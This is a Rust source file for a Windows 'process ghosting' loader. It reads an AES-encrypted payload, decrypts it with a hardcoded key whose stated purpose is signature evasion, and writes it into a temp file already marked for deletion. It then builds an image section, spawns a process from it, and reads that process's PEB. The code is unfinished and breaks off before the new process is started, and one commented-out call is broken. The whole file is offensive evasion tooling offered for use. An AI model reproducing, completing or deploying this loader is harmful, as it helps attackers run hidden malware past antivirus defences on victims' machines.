#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
use std::ffi::c_void;
use std::io::Read;
use windows::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64};
use windows::Win32::System::Environment::CreateEnvironmentBlock;
use windows::Win32::System::Memory::{SECTION_QUERY, SECTION_MAP_WRITE, SECTION_MAP_READ, SECTION_MAP_EXECUTE, SECTION_EXTEND_SIZE, PAGE_READONLY, SEC_IMAGE, VirtualAllocEx};
use windows::Win32::System::SystemInformation::IMAGE_FILE_MACHINE_AMD64;
use windows::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE, TEB};
use windows::Win32::System::Threading::{GetCurrentProcess, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, ProcessBasicInformation, PEB, RTL_USER_PROCESS_PARAMETERS};
use windows::core::{PCWSTR, PCSTR};
use windows::Win32::Foundation::{HANDLE, UNICODE_STRING, MAX_PATH};
use windows::Win32::System::Kernel::OBJ_CASE_INSENSITIVE;
use windows::Win32::System::WindowsProgramming::{NtOpenFile, OBJECT_ATTRIBUTES, IO_STATUS_BLOCK, FILE_SYNCHRONOUS_IO_NONALERT, FILE_INFORMATION_CLASS, RtlInitUnicodeString, NtClose};
use windows::Win32::Storage::FileSystem::{DELETE, SYNCHRONIZE, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_DISPOSITION_INFO, GetTempPathA, GetTempFileNameA, STANDARD_RIGHTS_REQUIRED};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};


// THIS IS NOT SECURE. But then, security isn't really a concern here. The encryption is just for basic signature evasion.
const NONCE: &[u8; 12] = b"unique nonce";

fn get_padded_key(key: String) -> [u8; 32] {
    let key_as_bytes = key.as_bytes();
    let mut padded_key: [u8; 32] = [0x00; 32];
    for i in 0..32.min(key.len()) {
        padded_key[i] = key_as_bytes[i];
    }
    padded_key
}

fn encrypt_plaintext(plaintext: &Vec<u8>, key: String) -> Result<Vec<u8>, aes_gcm::Error> {
    let padded_key = get_padded_key(key);
    let cipher = Aes256Gcm::new_from_slice(&padded_key).unwrap();
    let nonce = Nonce::from_slice(NONCE);

    let ciphertext = cipher.encrypt(nonce, plaintext.as_ref())?;
    Ok(ciphertext)
}

fn decrypt_ciphertext(ciphertext: &Vec<u8>, key: String) -> Result<Vec<u8>, aes_gcm::Error> {
    let padded_key = get_padded_key(key);
    let cipher = Aes256Gcm::new_from_slice(&padded_key).unwrap();
    let nonce = Nonce::from_slice(NONCE);

    let plaintext = cipher.decrypt(nonce, ciphertext.as_ref())?;
    Ok(plaintext)
}


union LARGE_INTEGER {
    DUMMYSTRUCTNAME: std::mem::ManuallyDrop<LARGE_INTEGER_s>,
    u: std::mem::ManuallyDrop<LARGE_INTEGER_u>,
    QuadPart: i64,
}

struct LARGE_INTEGER_s {
    LowPart: u32,
    HighPart: i32,
}

struct LARGE_INTEGER_u {
    LowPart: u32,
    HighPart: i32,
}

type PIO_STATUS_BLOCK = *mut IO_STATUS_BLOCK;
type PIO_APC_ROUTINE = Option<unsafe extern "system" fn(ApcContext: *mut c_void, IoStatusBlock: PIO_STATUS_BLOCK, Reserved: u32) -> ()>;

type _NtSetInformationFile = unsafe extern "system" fn(FileHandle: HANDLE, IoStatusBlock: PIO_STATUS_BLOCK, FileInformation: *mut c_void, Length: u32, FileInformationClass: FILE_INFORMATION_CLASS) -> u32;
static mut NtSetInformationFile: Option<_NtSetInformationFile> = None;

type _NtWriteFile = unsafe extern "system" fn(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: PIO_APC_ROUTINE, ApcContext: *mut c_void, IoStatusBlock: PIO_STATUS_BLOCK, Buffer: *mut u8, Length: u32, ByteOffset: *mut LARGE_INTEGER, Key: *mut u32) -> u32;
static mut NtWriteFile: Option<_NtWriteFile> = None;

type _NtCreateSection = unsafe extern "system" fn(SectionHandle: *mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, MaxiumSize: *mut LARGE_INTEGER, SectionPageProtection: u32, AllocationAttributes: u32, FileHandle: HANDLE) -> u32;
static mut NtCreateSection: Option<_NtCreateSection> = None;

type _NtCreateProcessEx = unsafe extern "system" fn(ProcessHandle: *mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: u32, SectionHandle: HANDLE, DebugPort: HANDLE, TokenHandle: HANDLE, JobMemberLevel: u32) -> u32;
static mut NtCreateProcessEx: Option<_NtCreateProcessEx> = None;

type _NtReadVirtualMemory = unsafe extern "system" fn(ProcessHandle: HANDLE, BaseAddress: *mut PEB, Buffer: *mut c_void, NumberOfBytesToRead: u32, NumberOfBytesRead: *mut u32) -> u32;
static mut NtReadVirtualMemory: Option<_NtReadVirtualMemory> = None;

type _RtlCreateProcessParametersEx = unsafe extern "system" fn(ProcessParameters: *mut RTL_USER_PROCESS_PARAMETERS, ImagePathName: *mut UNICODE_STRING, DllPath: *mut UNICODE_STRING, CurrentDirectory: *mut UNICODE_STRING, CommandLine: *mut UNICODE_STRING, Environment: *mut c_void, WindowTitle: *mut UNICODE_STRING, DesktopInfo: *mut UNICODE_STRING, ShellInfo: *mut UNICODE_STRING, RuntimeData: *mut UNICODE_STRING, Flags: u32) -> u32;
static mut RtlCreateProcessParametersEx: Option<_RtlCreateProcessParametersEx> = None;

// 1. Get pointers to Nt functions without bindings in windows-rs
fn get_nt_functions() -> Result<(), windows::core::Error> {
    let module_name = windows::s!("ntdll.dll");
    let h_module = unsafe { GetModuleHandleA(module_name)? };
    println!("→ ntdll.dll module base address: {:#02x?}", h_module.0);

    let mut lpprocname = windows::s!("NtSetInformationFile");
    let p_NtSetInformationFile = unsafe { GetProcAddress(h_module, lpprocname) };
    unsafe {
        NtSetInformationFile = std::mem::transmute(p_NtSetInformationFile);
    }
    println!("  → NtSetInformationFile loaded");

    lpprocname = windows::s!("NtWriteFile");
    let p_NtWriteFile = unsafe { GetProcAddress(h_module, lpprocname) }; 
    unsafe {
        NtWriteFile = std::mem::transmute(p_NtWriteFile);
    }
    println!("  → NtWriteFile loaded");

    lpprocname = windows::s!("NtCreateSection");
    let p_NtCreateSection = unsafe { GetProcAddress(h_module, lpprocname) }; 
    unsafe {
        NtCreateSection = std::mem::transmute(p_NtCreateSection);
    }
    println!("  → NtCreateSection loaded");

    lpprocname = windows::s!("NtCreateProcessEx");
    let p_NtCreateProcessEx = unsafe { GetProcAddress(h_module, lpprocname) }; 
    unsafe {
        NtCreateProcessEx = std::mem::transmute(p_NtCreateProcessEx);
    }
    println!("  → NtCreateProcessEx loaded");

    lpprocname = windows::s!("NtReadVirtualMemory");
    let p_NtReadVirtualMemory = unsafe { GetProcAddress(h_module, lpprocname) }; 
    unsafe {
        NtReadVirtualMemory = std::mem::transmute(p_NtReadVirtualMemory);
    }
    println!("  → NtReadVirtualMemory loaded");

    lpprocname = windows::s!("RtlCreateProcessParametersEx");
    let p_RtlCreateProcessParametersEx = unsafe { GetProcAddress(h_module, lpprocname) }; 
    unsafe {
        RtlCreateProcessParametersEx = std::mem::transmute(p_RtlCreateProcessParametersEx);
    }
    println!("  → RtlCreateProcessParametersEx loaded");

    Ok(())
}

// 2. Generate absolute path for temporary file in %TEMP%
fn get_temp_path() -> String {
    let mut temp_path: [u8; MAX_PATH as usize] = [0; MAX_PATH as usize];
    if unsafe { GetTempPathA(Some(&mut temp_path)) } == 0 {
        println!("[!] Unable to find temp directory");
        std::process::exit(-1);
    }

    let path_pcstr = PCSTR(temp_path.as_ptr());
    let prefix_pcstr = PCSTR([0u8; 1].as_ptr());
    let mut temp_name: [u8; MAX_PATH as usize] = [0; MAX_PATH as usize];
    if unsafe { GetTempFileNameA(path_pcstr, prefix_pcstr, 0, &mut temp_name) } == 0 {
        println!("[!] Unable to create temp filename");
        std::process::exit(-1);
    }

    let result = String::from_utf8(temp_name.to_vec()).unwrap();
    println!("→ Ghost file created at at {}", result);
    result
}

// 3. Open temporary file
fn open_temp_file(filename: &String) -> Result<HANDLE, windows::core::Error> {
    let mut h_file = HANDLE::default();

    let desired_access = DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE;

    let mut filename_utf16 = format!("\\??\\{}", filename).encode_utf16().collect::<Vec<u16>>();
    filename_utf16.push(0x00);
    let filename_pcwstr = PCWSTR(filename_utf16.as_mut_ptr());
    let mut filename_unicode = UNICODE_STRING::default();
    unsafe { RtlInitUnicodeString(&mut filename_unicode, filename_pcwstr) };

    let mut object_attributes = OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        ObjectName: &mut filename_unicode,
        RootDirectory: HANDLE::default(),
        Attributes: OBJ_CASE_INSENSITIVE as u32,
        SecurityDescriptor: 0 as *mut c_void,
        SecurityQualityOfService: 0 as *mut c_void,
    };
    
    let mut io_status_block = IO_STATUS_BLOCK::default();

    let share_access = FILE_SHARE_READ | FILE_SHARE_WRITE;

    let open_options = FILE_SUPERSEDE.0 | FILE_SYNCHRONOUS_IO_NONALERT;
    
    let res = unsafe {
        NtOpenFile(
            &mut h_file,
            desired_access.0,
            &mut object_attributes,
            &mut io_status_block,
            share_access.0,
            open_options
        )
    };

    match res {
        Ok(_) => Ok(h_file),
        Err(e) => Err(e),
    }
}

// 4. Set temporary file state to pending deletion
fn set_file_status(h_file: HANDLE) -> bool {
    let mut status_block = unsafe { std::mem::zeroed::<IO_STATUS_BLOCK>() };
    let p_status_block: PIO_STATUS_BLOCK = &mut status_block;
    let mut file_info = FILE_DISPOSITION_INFO { DeleteFile: windows::Win32::Foundation::BOOLEAN::from(true) };
    let p_file_info: *mut c_void = &mut file_info as *mut _ as *mut c_void;

    let res = unsafe { NtSetInformationFile.unwrap()(
        h_file,
        p_status_block,
        p_file_info,
        std::mem::size_of::<FILE_DISPOSITION_INFO>() as u32,
        FILE_INFORMATION_CLASS(13)  // 13 = FileDispositionInformation
    ) };

    if res < 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return true;
    }
    
    false
}

// 5. Read payload from source file into buffer
fn get_payload_data(file: &String) -> Result<Vec<u8>, std::io::Error> {
    let f = std::fs::File::open(file)?;
    let mut reader = std::io::BufReader::new(f);
    let mut buffer = Vec::<u8>::new();
    reader.read_to_end(&mut buffer)?;
    Ok(buffer)
}

// 6. Write payload to temporary file    
fn write_temp_file(h_file: HANDLE, payload: &Vec<u8>) -> bool {
    let payload_length = payload.len() as u32;
    let mut payload_buffer = payload.clone();
    let p_payload_buffer = payload_buffer.as_mut_ptr();
    let mut status_block = IO_STATUS_BLOCK::default();
    let mut byte_offset = unsafe { std::mem::zeroed::<LARGE_INTEGER>() };
    let mut key: u32 = 0;

    println!("→ Decrypted data at {:#02x?}, writing to ghost file", p_payload_buffer);
    let res = unsafe { 
        NtWriteFile.unwrap()(
            h_file,
            HANDLE::default(),
            std::mem::zeroed::<PIO_APC_ROUTINE>(),
            0 as *mut c_void,
            &mut status_block,
            p_payload_buffer,
            payload_length,
            &mut byte_offset,
            &mut key
        ) 
    };
    
    if res < 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return true;
    }

    println!("[!] Failed to write to ghost file, status code: {:#02x?}", res);
    false
}

// 7. Map a new executable section to the file
fn create_section(h_file: HANDLE) -> Result<HANDLE, String> {
    let mut h_section = HANDLE::default();
    let desired_access = (SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE).0 | STANDARD_RIGHTS_REQUIRED.0;
    let mut max_size = unsafe { std::mem::zeroed::<LARGE_INTEGER>() };
    
    let res = unsafe {
        NtCreateSection.unwrap()(
            &mut h_section,
            desired_access,
            std::ptr::null_mut(),
            &mut max_size,
            PAGE_READONLY.0,
            SEC_IMAGE.0,
            h_file
        )
    };

    unsafe { NtClose(h_file); }

    if res < 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return Ok(h_section);
    }

    Err(format!("✗ Failed to create new section mapping, status: {:#02x?}", res))
}

// 8. Create new process with pre-created image section
fn create_process(h_section: HANDLE) -> Result<HANDLE, String> {
    let mut h_process = HANDLE::default();
    let desired_access: u32 = 0x000F0000 | 0x00100000 | 0xFFFF;
    let h_current_process = unsafe { GetCurrentProcess() };

    let res = unsafe {
        NtCreateProcessEx.unwrap()(
            &mut h_process,
            desired_access,
            std::ptr::null_mut(),
            h_current_process,
            0x00000004 as u32,
            h_section,
            HANDLE::default(),
            HANDLE::default(),
            0
        )
    };

    if res < 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return Ok(h_process);
    }

    Err(format!("[!] Failed to create new process, status code: {:#02x?}", res))
}

// 9. Get process basic information
fn query_process(h_process: HANDLE) -> Result<PROCESS_BASIC_INFORMATION, windows::core::Error> {
    let mut process_information = PROCESS_BASIC_INFORMATION::default();
    let mut return_length: u32 = 0;

    let res = unsafe {
        NtQueryInformationProcess(
            h_process,
            ProcessBasicInformation,
            &mut process_information as *const _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        )
    };

    match res {
        Ok(_) => Ok(process_information),
        Err(e) => Err(e),
    }
}


fn clone_peb(h_process: HANDLE, process_info: PROCESS_BASIC_INFORMATION) -> Result<PEB, String> {
    let remote_peb_addr = process_info.PebBaseAddress;
    let mut buf = PEB::default();
    let mut _bytes_read = 0;

    let res = unsafe {
        NtReadVirtualMemory.unwrap()(
            h_process,
            remote_peb_addr,
            &mut buf as *const _ as *mut c_void,
            std::mem::size_of::<PEB>() as u32,
            &mut _bytes_read
        )
    };

    if res < 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return Ok(buf);
    }

    Err(format!("[!] Failed to clone PEB, status code: {:#02x?}", res))
}

fn get_entrypoint(payload: &Vec<u8>) -> Result<u32, String> {
    let mut payload_buffer = payload.clone();
    let p_payload_buffer = payload_buffer.as_mut_ptr();

    let img_dos_header = p_payload_buffer as *const IMAGE_DOS_HEADER;
    unsafe {
        if (*img_dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(format!("Payload not a valid DOS executable"));
        }
    }

    let offset = unsafe { (*img_dos_header).e_lfanew };
    if offset > 1024 {
        return Err(format!("Offset greater than max offset, buffer corrupted?"));
    }

    let inh = (p_payload_buffer as usize + offset as usize) as *const IMAGE_NT_HEADERS32;
    unsafe {
        if (*inh).Signature != IMAGE_NT_SIGNATURE {
            return Err(format!("Image signature validation failed"))
        }
    }

    let arch = unsafe { (*inh).FileHeader.Machine };

    let entrypoint_addr = match arch {
        IMAGE_FILE_MACHINE_AMD64 => unsafe { (*(inh as *const IMAGE_NT_HEADERS64)).OptionalHeader.AddressOfEntryPoint },
        _ => unsafe { (*inh).OptionalHeader.AddressOfEntryPoint }
    };

    Ok(entrypoint_addr)
}

fn write_process_parameters(h_process: HANDLE, process_info: PROCESS_BASIC_INFORMATION, target_file: &String) -> Result<RTL_USER_PROCESS_PARAMETERS, String> {
    let mut filename_utf16 = target_file.encode_utf16().collect::<Vec<u16>>();
    filename_utf16.push(0x00);
    let filename_pcwstr = PCWSTR(filename_utf16.as_mut_ptr());
    let mut filename_unicode = UNICODE_STRING::default();
    unsafe { RtlInitUnicodeString(&mut filename_unicode, filename_pcwstr) };

    let mut current_dir_utf16 = std::env::current_dir().unwrap().into_os_string().into_string().unwrap().encode_utf16().collect::<Vec<u16>>(); // chain from hell, my eyes. MY EYES.
    current_dir_utf16.push(0x00);
    let current_dir_pcwstr = PCWSTR(current_dir_utf16.as_mut_ptr());
    let mut current_dir_unicode = UNICODE_STRING::default();
    unsafe { RtlInitUnicodeString(&mut current_dir_unicode, current_dir_pcwstr) };

    let mut dll_dir_utf16 = "C:\\Windows\\System32".encode_utf16().collect::<Vec<u16>>();
    dll_dir_utf16.push(0x00);
    let dll_dir_pcwstr = PCWSTR(dll_dir_utf16.as_mut_ptr());
    let mut dll_dir_unicode = UNICODE_STRING::default();
    unsafe { RtlInitUnicodeString(&mut dll_dir_unicode, dll_dir_pcwstr) };

    let mut window_name_utf16 = "rewks".encode_utf16().collect::<Vec<u16>>();
    window_name_utf16.push(0x00);
    let window_name_pcwstr = PCWSTR(window_name_utf16.as_mut_ptr());
    let mut window_name_unicode = UNICODE_STRING::default();
    unsafe { RtlInitUnicodeString(&mut window_name_unicode, window_name_pcwstr) };

    let mut process_params = RTL_USER_PROCESS_PARAMETERS::default();

    let mut environment_block = 0 as *mut c_void;
    unsafe { CreateEnvironmentBlock(&mut environment_block, HANDLE::default(), true); }

    let res = unsafe {
        RtlCreateProcessParametersEx.unwrap()(
            &mut process_params,
            &mut filename_unicode,
            &mut dll_dir_unicode,
            &mut current_dir_unicode,
            &mut filename_unicode,
            environment_block,
            &mut window_name_unicode,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x01
        )
    };

    if res >= 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return Err(format!("[!] Failed to write process parameters, status code: {:#02x?}", res));
    }

    // let res = unsafe {
    //     VirtualAllocEx(
    //         h_process,
    //         Some(&mut process_params as *mut _ as *mut c_void),
    //         process_params.Reserved1[1] + process_params.,
    //         flallocationtype,
    //         flprotect
    //     )
    // };



    Ok(process_params)
}



fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 3 {
        println!("Usage: {} <source_file> <target_file>", args[0]);
        std::process::exit(-1);
    }
    let source_file = &args[1];
    let target_file = &args[2];

    match get_nt_functions() {
        Ok(_) => (),
        Err(e) => {
            println!("⚠ Could not get address of Nt functions! Err {} : {}", e.code(), e.message());
            std::process::exit(-1);
        }
    }

    let ghost_file = get_temp_path();
    let file_handle = match open_temp_file(&ghost_file) {
        Ok(h) => h,
        Err(e) => {
            println!("[!] Failed to create ghost file! Err {} : {}", e.code(), e.message());
            std::process::exit(-1);
        }
    };
    
    let delete_pending = set_file_status(file_handle);
    if !delete_pending {
        println!("⚠ Unable to set file for deletion. Exiting.");
        std::process::exit(-1);
    }
    println!("→ Ghost file status set to pending deletion");

    let encrypted_payload = match get_payload_data(source_file) {
        Ok(p) => p,
        Err(e) => {
            println!("⚠ Unable to read data from source file '{}'. Err {:#02x?}", source_file, e.raw_os_error().unwrap());
            std::process::exit(-1);
        }
    };
    println!("→ Encrypted data read from {}", source_file);

    let plain_payload = match decrypt_ciphertext(&encrypted_payload, String::from("testkey")) {
        Ok(payload) => payload,
        Err(e) => {
            println!("⚠ Unable to decrypt payload.");
            std::process::exit(-1);
        }
    };

    let payload_written = write_temp_file(file_handle, &plain_payload);
    if !payload_written {
        println!("⚠ Failed to write payload to ghost file!");
        std::process::exit(-1);
    }

    let section_handle = match create_section(file_handle) {
        Ok(h) => h,
        Err(e) => {
            println!("{}", e);
            std::process::exit(-1);
        }
    };
    println!("→ Image Section created");

    let process_handle = match create_process(section_handle) {
        Ok(h) => h,
        Err(e) => {
            println!("{}", e);
            std::process::exit(-1);
        }
    };
    
    let process_info = match query_process(process_handle) {
        Ok(info) => info,
        Err(e) => {
            println!("⚠ Error encountered when querying child process: {} {}", e.code(), e.message());
            std::process::exit(-1);
        }
    };
    println!("→ Child process created with pid {}", process_info.UniqueProcessId);
    
    let peb_copy = match clone_peb(process_handle, process_info) {
        Ok(peb) => peb,
        Err(e) => {
            println!("{}", e);
            std::process::exit(-1);
        }
    };
    let image_base_address = peb_copy.Reserved3[1];
    println!("→ Cloned process PEB, base image address at {:#02x?}", image_base_address);

    let entrypoint_address = match get_entrypoint(&plain_payload) {
        Ok(addr) => addr,
        Err(e) => {
            println!("{}", e);
            std::process::exit(-1);
        }
    };
    println!("→ Retrieved entrypoint of payload {:#02x?}", entrypoint_address);

    let process_entrypoint = entrypoint_address as u64 + image_base_address as u64;
    println!("→ Process entrypoint {:#02x?}", process_entrypoint);

    write_process_parameters(process_handle, process_info, target_file);
}





// alternate stuff down here. not needed but left in just in case

/*
type _NtWriteFile = unsafe extern "system" fn(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: PIO_APC_ROUTINE, ApcContext: *mut c_void, IoStatusBlock: PIO_STATUS_BLOCK, Buffer: *mut c_void, Length: u32, ByteOffset: *mut LARGE_INTEGER, Key: *mut u32) -> u32;

fn read_payload(file: &String) -> Result<(*mut c_void, u32), String> {
    let mut file_utf16 = file.encode_utf16().collect::<Vec<u16>>();
    file_utf16.push(0x00);
    let file_pcwstr = PCWSTR(file_utf16.as_ptr());
    let open_file_result = unsafe {
        CreateFileW(
            file_pcwstr,
            FILE_GENERIC_READ,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None
        )
    };

    let h_file = match open_file_result {
        Ok(h) => h,
        Err(e) => {
            return Err(format!("Failed to open payload file for reading: {} {}", e.code(), e.message()));
        }
    };

    let create_mapping_result = unsafe {
        CreateFileMappingW(
            h_file,
            None,
            PAGE_READONLY,
            0,
            0,
            windows::w!("")
        )
    };

    let h_map = match create_mapping_result {
        Ok(h) => h,
        Err(e) => {
            unsafe { CloseHandle(h_file) };
            return Err(String::from("Failed to create payload file mapping"));
        }
    };

    let h_view = unsafe {
        MapViewOfFile(
            h_map,
            FILE_MAP_READ,
            0,
            0,
            0
        )
    };

    if h_view == 0 as *mut c_void {
        unsafe {
            CloseHandle(h_map);
            CloseHandle(h_file);
        }
        return Err(String::from("Failed to map view of payload file"));
    }

    let f_size = unsafe { GetFileSize(h_file, None) };

    let m_addr = unsafe {
        VirtualAlloc(
            None,
            f_size as usize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        )
    };

    if m_addr == 0 as *mut c_void {
        unsafe {
            UnmapViewOfFile(h_view);
            CloseHandle(h_map);
            CloseHandle(h_file);
        }
        return Err(String::from("Failed to allocate memory to copy payload"));
    }

    unsafe {
        std::ptr::copy_nonoverlapping(h_view, m_addr, f_size as usize);
        UnmapViewOfFile(h_view);
        CloseHandle(h_map);
        CloseHandle(h_file);
    }

    Ok((m_addr, f_size))

}

fn write_temp_file(h_file: HANDLE, payload_file: &String) -> bool {
    let (payload_buffer, payload_length) = match read_payload(payload_file) {
        Ok((payload, length)) => (payload, length),
        Err(s) => {
            println!("[!] {}", s);
            std::process::exit(-1);
        }
    };

    let mut status_block = IO_STATUS_BLOCK::default();
    let mut byte_offset = unsafe { std::mem::zeroed::<LARGE_INTEGER>() };
    let mut key: u32 = 0;

    println!("→ Decrypted data at {:#02x?}, writing to ghost file", payload_buffer);
    let res = unsafe { 
        NtWriteFile.unwrap()(
            h_file,
            HANDLE::default(),
            std::mem::zeroed::<PIO_APC_ROUTINE>(),
            0 as *mut c_void,
            &mut status_block,
            payload_buffer,
            payload_length,
            &mut byte_offset,
            &mut key
        ) 
    };
    
    if res < 0xC0000000 { // https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values
        return true;
    }

    println!("[!] Failed to write to ghost file, status code: {:#02x?}", res);
    false
}


*/